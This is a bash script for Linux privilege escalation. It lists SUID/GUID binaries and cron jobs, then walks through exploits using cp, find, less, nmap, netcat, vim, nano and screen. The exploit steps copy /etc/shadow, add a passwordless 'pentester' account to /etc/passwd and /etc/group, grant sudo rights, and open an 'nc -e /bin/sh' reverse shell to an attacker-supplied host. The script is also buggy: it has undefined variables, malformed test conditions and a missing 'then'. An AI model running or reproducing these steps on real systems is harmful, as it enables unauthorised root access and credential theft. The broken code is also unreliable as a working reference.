#!/bin/bash

# This script is for finding commands with root SUID permissions and printing info for possible exploitation

SUID=$(find / -perm -u=s -type f 2>/dev/null)
GUID=$(find / -user root -perm 2000 -print 2> /dev/null)
EXPLOIT_CMDS=(nmap vim find netcat less cp nano screen)

echo "=================================================================="
echo "|            LINUX COMMON PRIVESC CHECK RESULTS                  |"
echo "=================================================================="

for i in "${exploit_cmds[@]}"
do 
	RESULTS=$(grep -q "${i}" <<< "$SUID" && printf "$i root method is possibly exploitable!\n" || printf "$i ""root method is not exploitable\n")
	echo "${RESULTS[*]}"
done


echo "=================================================================="
echo "|           SUID File List Located in PWD File suid.txt          |"
echo "------------------------------------------------------------------"
echo "$SUID" > "$(pwd)/suid.txt" 
echo "=================================================================="
echo "|           GUID File List Located in PWD File guid.txt          |"
echo "=================================================================="
echo "$GUID" > "$(pwd)/guid.txt"
echo "=================================================================="
echo "|                   CRON JOBS ON MACHINE                         |"
echo "|----------------------------------------------------------------|"
echo "$(ls --color=auto -las /etc/cron.d)"
echo "=================================================================="
echo "|                CRON JOB SCRIPT CONTENTS                        |"
echo "------------------------------------------------------------------"
find /etc/cron.d -type f -exec cat {} \; | awk '$1 ~ /^[^;#]/' | sed G   
echo "=================================================================="

for ex in "$EXPLOIT_CMDS"; do
	privesc_available=$(echo $RESULTS | grep -q "$ex root method is possibly exploitable!")
	if [ $privesc_available ]; then
		exploit_options=echo "Would you like to attempt privesc using $ex?  "
		options=("Yes Attempt PrivEsc " "No I am Just Testing ")

		select opt in "${options[@]}"
		do
			case $opt in
				"Yes Attempt PrivEsc ")
					echo "Attempting privesc using $ex SUID bit..."
					;;
				"No I am Just Testing ")
					echo "you chose to not attempt $ex privesc."
					break
					;;
			esac
		done
		
		# cp suid privesc method
		if [ $ex | grep "cp" ]
		then
			echo "Copy a users password hash from the /etc/shadow file and crack it or pass it"
			sleep 5s
			cp /etc/shadow /tmp/shadowread
			cp /etc/passwd /tmp/passwdread
			cp /etc/passwd /tmp/groupread
			echo "pentester:*:1002:1003:,,,:/home/pentester:/bin/bash" >> /tmp/passwdread
			echo "pentester:*:1003:" >> /tmp/groupread
			cp /tmp/groupread /etc/group
			cp /tmp/passwdread /etc/passwd
			echo "Username: pentester"
			echo "No password set for pentester. Password must be set. "
			passwd pentester
			echo "If the passwd command above did not work in setting the password try the below command and then su as pentester."
			echo "openssl passwd -1 -salt pentester P@ssw0rd1!"
		fi
		
		# find suid privesc method
		if [ $ex | grep "find" ]; then
			touch test
			find test -exec "whoami" \;
			echo "Issue commands as root using the below syntax."
			echo "find test -exec \"<command here> \" \\;"
		fi

		# less suid privesc method
		if [ $ex | grep "less" ]; then
			echo "Using the less SUID privesc method"
			sudo install -m =xs $(which less) .
			./less file_to_read
		fi
		
		# nmap suid privesc method
		if [ $ex | grep 'nmap' ]; then
			echo "Enter bash commands in the nmap terminal by entering the below command once it is open."
			echo "!sh"
			sleep 5s
			nmap --interactive	
		fi

		# netcat suid privesc method
		if [ $ex | grep ['netcat','nc'] ]
			echo "You will need to start a listener on your attack machine EXAMPLE: nc -lvnp 1337"
			echo "Enter your attack machines IP address: "
			read RHOST
			echo "Enter the port your attack machine will listen on"
			read RPORT
			./nc -e /bin/sh $RHOST $RPORT
		fi
		
		# vim suid privesc method
		if [ $ex | /bin/grep "vim" ]; then
			ls -la --clor=auto /usr/bin/vim
			ls -la --color=auto /usr/bin/alternatives/vim
			chmod u+s /usr/bin/vim.basic
			echo "visudo command is going to run in 5 seconds"
			echo "Give "$(whoami)" sudo permissions by adding the following to the sudoers file."
			echo "$(whoami) ALL=(ALL:ALL) ALL"
			sleep 5s
			visudo 
		fi

		# nano suid privesc method
		if [ $ex | grep "nano" ]; then
			echo "Copy the password hash from the shadow file and crack it or pass it."
			sleep 5s
			nano /etc/shadow
			echo 'Or try adding a wildcard character in the second field of the /etc/passwd file to remove a users existing password.'
			echo "You have 10 seconds to copy the below line to paste into the /etc/passwd file that is about to open for editing."
			echo "pentester:*:1002:1003:,,,:/home/pentester:/bin/bash"
			sleep 10s
			nano /etc/passwd
		fi
		
		# screen suid privesc method
		if [ $ex | grep "screen" ]; then
			echo "Using screen command to obtain root privilege"
			export TERM='vt100'
			screen -x root/root
		fi
	fi
done
